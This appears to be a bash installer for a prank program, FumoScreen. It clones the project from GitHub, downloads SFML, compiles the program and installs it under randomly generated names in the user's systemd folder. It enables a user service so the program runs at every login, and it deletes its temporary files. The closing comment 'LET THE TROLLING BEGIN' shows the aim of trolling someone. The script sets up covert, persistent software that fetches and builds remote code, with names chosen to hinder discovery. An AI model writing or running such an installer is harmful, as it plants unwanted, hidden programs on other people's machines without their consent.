#!/usr/bin/bash
set -e

echo "USING SESSION TYPE " $XDG_SESSION_TYPE

user="$(whoami)"

# GENERATE RANDOM NAMES FOR SCRIPT
FUMO_MAGIC_TOKEN="PSS21"
FOLDER=$FUMO_MAGIC_TOKEN$(cat /dev/urandom | tr -dc '[:alpha:]' | dd status=none bs=1 count=15)
NAME=$FUMO_MAGIC_TOKEN$(cat /dev/urandom | tr -dc '[:alpha:]' | dd status=none bs=1 count=10)

# PREPARE SYSTEMD FOLDER
rm -rf "$HOME"/.config/systemd/user/${FUMO_MAGIC_TOKEN}*
mkdir -p "$HOME"/.config/systemd/user/"$FOLDER"

# CLONE REPO TO TMP
rm -rf /tmp/fumo
git clone https://github.com/AshleyTheNeko/FumoScreen.git /tmp/fumo
cd /tmp/fumo

# CLONES SFML FOR DEPENDENCY
wget https://www.sfml-dev.org/files/SFML-2.5.1-linux-gcc-64-bit.tar.gz
tar -xf *tar.gz
mv -f SFML*/include/* includes
mv -f SFML*/lib .

# FIND X LIBS FOR DEPENDENCIES
LIBX11=($(find /lib64/ /lib/ | grep "libX11.so.*"))
LIBXFIXES=($(find /lib64/ /lib/ | grep "libXfixes.so.*"))
cp ${LIBX11[0]} ./lib/libX11.so
cp ${LIBXFIXES[0]} ./lib/libXfixes.so

# REPLACE NAMES
sed -e "s/ashley/$user/g" -e "s/FUMOFOLDER/$FOLDER/g" -e "s/FUMONAME/$NAME/g" default.cpp > fumo.cpp
sed -e "s/ashley/$user/g" -e "s/FUMOFOLDER/$FOLDER/g" -e "s/FUMONAME/$NAME/g" default_service > ${NAME}.service

make

# MOVE PACKAGE TO DESTINATION
mv -f fumo "$HOME"/.config/systemd/user/${FOLDER}/$NAME
mv -f ${NAME}.service "$HOME"/.config/systemd/user/
mv -f assets "$HOME"/.config/systemd/user/${FOLDER}/
mv -f lib "$HOME"/.config/systemd/user/${FOLDER}/

rm -rf /tmp/fumo



# LET THE TROLLING BEGIN
systemctl --user enable ${NAME}.service